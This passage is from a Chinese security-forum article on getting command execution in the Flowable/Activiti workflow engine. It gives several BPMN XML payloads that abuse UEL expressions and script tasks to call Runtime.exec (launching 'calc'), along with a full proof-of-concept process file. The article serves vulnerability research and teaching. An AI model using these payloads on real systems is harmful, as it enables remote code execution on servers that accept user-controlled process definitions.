---
title: Flowable漏洞攻防战：深入流程引擎的利用
url: https://forum.butian.net/share/3823
source: 奇安信攻防社区
date: 2024-10-30
fetch_date: 2025-10-06T18:45:30.869081
---

# Flowable漏洞攻防战：深入流程引擎的利用

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### Flowable漏洞攻防战：深入流程引擎的利用

* [漏洞分析](https://forum.butian.net/topic/48)

Flowable 是⼀个⽤ Java 编写的轻量级业务流程引擎。Flowable 流程引擎允许您部署 BPMN2.0 流程定义（⽤于定义流程的⾏业 XML 标准）、创建这些流程定义的流程实例、运⾏查询、访问活动或历史流程实例和相关数据等等。当flowable的模板处于可控状态时，则可通过添加恶意表达式从而实现执行命令。

Flowable简介
----------
Flowable 是一个用 Java 编写的轻量级业务流程引擎。Flowable 流程引擎允许您部署 BPMN 2.0 流程定义（用于定义流程的行业 XML 标准）、创建这些流程定义的流程实例、运行查询、访问活动或历史流程实例和相关数据等等。
在将 Flowable 添加到您的应用程序/服务/架构中时，它非常灵活。您可以通过包含以 JAR 形式提供的 Flowable 库将引擎\*嵌入\*到您的应用程序或服务中。由于它是一个 JAR，因此您可以轻松地将其添加到任何 Java 环境中：Java SE；servlet 容器，例如 Tomcat 或 Jetty、Spring；Java EE 服务器，例如 JBoss 或 WebSphere 等等。或者，您可以使用 Flowable REST API 通过 HTTP 进行通信。还有几个 Flowable 应用程序（Flowable Modeler、Flowable Admin、Flowable IDM 和 Flowable Task），它们提供了用于处理流程和任务的现成示例 UI。
所有设置 Flowable 的方法都具有核心引擎，它可以看作是一组服务，这些服务公开 API 来管理和执行业务流程。
### Flowable 和 Activiti
Flowable 是 Activiti（Alfresco 的注册商标）的一个分支。这两个其实区别不大，可能在标签名称上会有一些变化，但造成漏洞的点基本相同。
### 环境搭建
环境搭建的具体步骤参见下面的链接
[SpringBoot + Flowable并集成ui](https://mp.weixin.qq.com/s/yDUHeD8O1mLbNKXeV1wZbA)
### 表达式
Flowable 使用[统一表达式语言 (UEL)](https://javaee.github.io/tutorial/jsf-el.html)来解析表达式。UEL 的文档是语法和可用运算符的良好参考。每个表达式都以 开头`${`并以 结尾`}`。
表达式有两种类型：
- \*\*值表达式\*\*提供一个值。支持的值包括布尔值、字符串、整数、浮点数和 null。典型的值表达式是`${variable.property}`或`${bean.property}`。
- \*\*方法表达式\*\*可以调用带参数或不带参数的方法。方法表达式的一个示例是`${bean.setPropertyValue('newValue')}`。要区分值表达式和不带任何参数的方法表达式，请在方法调用末尾使用空括号。例如，`${variable.toString()}`。
理论上，任何暴露给应用程序的 Spring bean 都可以用于后端表达式，但并非所有类都能以允许正确表达式评估的方式进行序列化。
标签简介
----
介绍一些常用于漏洞利用的标签
### `<timerEventDefinition>`
- \*\*用途\*\*: `<timerEventDefinition>` 标签用于定义一个定时器事件。它可以在多种场景中使用，如中间定时器事件、边界定时器事件、开始定时器事件等。
- \*\*场景\*\*:
- \*\*开始事件\*\*: 定时器事件可以作为流程的开始事件，表示流程将在特定时间或间隔后启动。
- \*\*中间事件\*\*: 定时器事件可以用作中间事件，表示流程需要等待一段时间后继续执行。
- \*\*边界事件\*\*: 定时器事件可以附加到某个活动（如用户任务）上，表示在指定时间后触发特定行为（如任务超时处理）。
#### `<timeDuration>`
- \*\*用途\*\*: `<timeDuration>` 标签定义了一个时间间隔，用于指定定时器触发的延迟时间。这是 `ISO-8601` 标准格式的字符串，表示一个时间段，例如 `PT5M` 表示 5 分钟。同时支持表达式方式
```xml
<!-- 处于startEvent标签中 -->
<timerEventDefinition>
<timeDuration>
${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}
</timeDuration>
</timerEventDefinition>
```
对应 在 Flowable Web Modeler (这个是Flowable官方提供的一个Web页面，方便自定义流程)中的位置
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-6736851efdc7849a682d3bc9c2f3b5a627682c56.png)
#### `<timeCycle>`
`<timeCycle>` 标签可以用于定义一个周期性的定时器，表达式可以动态生成一个周期表达式
```xml
<!-- timeCycle直接使用function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\') -->
<!-- 会抛出类型错误 -->
<timerEventDefinition>
<timeCycle>
${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){return java.lang.Runtime.getRuntime().exec(\'calc\')};test()')}
</timeCycle>
</timerEventDefinition>
```
对应 在 Flowable Web Modeler 中的位置
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-2e4a40b3fc1a283b89436a15040d7082ee29c0a8.png)
#### `<timeDate>`
`<timeDate>` 标签可以用于指定一个具体的触发日期时间。
```xml
<timerEventDefinition>
<timeDate>
${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}
</timeDate>
</timerEventDefinition>
```
对应 在 Flowable Web Modeler 中的位置
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-a8e198f5d269bb7d76215c366be935b202096ab8.png)
### `<extensionElements>`
该标签是 BPMN 2.0 规范中的标准标签，允许在标准 BPMN 元素上添加自定义的扩展。Flowable 通过这个标签支持许多自定义元素，例如监听器、字段、脚本等。
#### `<flowable:executionListener>`
是 Flowable 的扩展标签，允许你在流程的某些执行点（如开始、结束、任务到达时等）触发自定义代码。这个标签通常用于监听并处理流程中的执行事件，定义特定的业务逻辑。
```xml
<flowable:executionListener event="start" expression="${&#34;&#34;.getClass().forName(&#34;javax.script.ScriptEngineManager&#34;).newInstance().getEngineByName(&#34;js&#34;).eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}">
</flowable:executionListener>
```
对应 在 Flowable Web Modeler 中的位置
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-cf72ee0f7f02fed714aee30afc7cc4be02b61fc1.png)
### `<sequenceFlow>`
该标签用于定义流程中的顺序连接，它连接两个流程元素，比如活动（Activity）、网关（Gateway）或事件（Event），并指定流程的执行路径。 其中该标签中有个关键点\*\*条件流\*\*（ 可以通过定义条件表达式【如 UEL 表达式】来控制何时执行该流）
#### `<conditionExpression>`
该标签在 BPMN 中用于定义条件表达式，用来控制流程流转路径。它通常与 `` 标签配合使用
```xml
<!-- 执行UEL表达式时，可以不加xsi:type="tFormalExpression" -->
<sequenceFlow id="flow1" sourceRef="startEvent1" targetRef="startEvent1">
<conditionExpression xsi:type="tFormalExpression"><![CDATA[${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}]]></conditionExpression>
</sequenceFlow>
```
对应 在 Flowable Web Modeler 中的位置
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-6a59b20d523ec8b3b3782c99a3f237266339b530.png)
### `<scriptTask>`
是 Flowable 用于执行脚本代码的任务节点。它允许在流程运行期间执行任意脚本语言的代码，例如 JavaScript、Groovy、Python 等。
#### `<script>`
```xml
<scriptTask id="scriptTask1" scriptFormat="groovy">
<script>
<![CDATA[
'calc'.execute()
]]>
</script>
</scriptTask>
<!-- 注意，需要有步骤引用了定义的脚本任务scriptTask -->
<sequenceFlow sourceRef="startEvent1" targetRef="scriptTask1"/>
```
```xml
<scriptTask id="scriptTask1" scriptFormat="groovy">
<script>
a=java.lang.Runtime.getRuntime().exec("calc")
</script>
</scriptTask>
<!-- 注意，需要有步骤引用了定义的脚本任务scriptTask -->
<sequenceFlow sourceRef="startEvent1" targetRef="scriptTask1"/>
```
当然还有很多其他利用的标签，这里只列举了一些较为常用的
漏洞分析
----
### 流程部署时能够解析表达式的标签
```text
<timeDuration>
<timeCycle>
<timeDate>
....
```
此处以`<timeDuration>`标签为例，分析一下程序流程
```java
// 获取默认的流程引擎
ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();
// 获取 RepositoryService
RepositoryService repositoryService = processEngine.getRepositoryService();
// 部署流程定义
repositoryService.createDeployment()
.addClasspathResource(file + ".bpmn20.xml")
.deploy();
```
测试Poc如下：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"
xmlns:activiti="http://activiti.org/bpmn"
typeLanguage="http://www.w3.org/2001/XMLSchema"
expressionLanguage="http://www.w3.org/1999/XPath"
targetNamespace="http://www.activiti.org/test">
<process id="meeting" name="meeting" isExecutable="true">
<startEvent id="startEvent1" name="Start" activiti:initiator="host">
<timerEventDefinition>
<timeDuration>
${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}
</timeDuration>
</timerEventDefinition>
</startEvent>
<userTask id="userTask2" name="meeting2" activiti:assignee="${person}" activiti:formKey="meeting/signate">
<multiInstanceLoopCharacteristics isSequential="false" activiti:collection="people"
activiti:elementVariable="person"></multiInstanceLoopCharacteristics>
</userTask>
<userTask id="usertask3" name="meeting3" activiti:assignee="${host}" activiti:formKey="meeting/input">
</userTask>
</process>
</definitions>
```
在`deploy()`方法处下断
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-e064e077c500a50263776afe792dffb100635074.png)
经过重载，来到`org.flowab...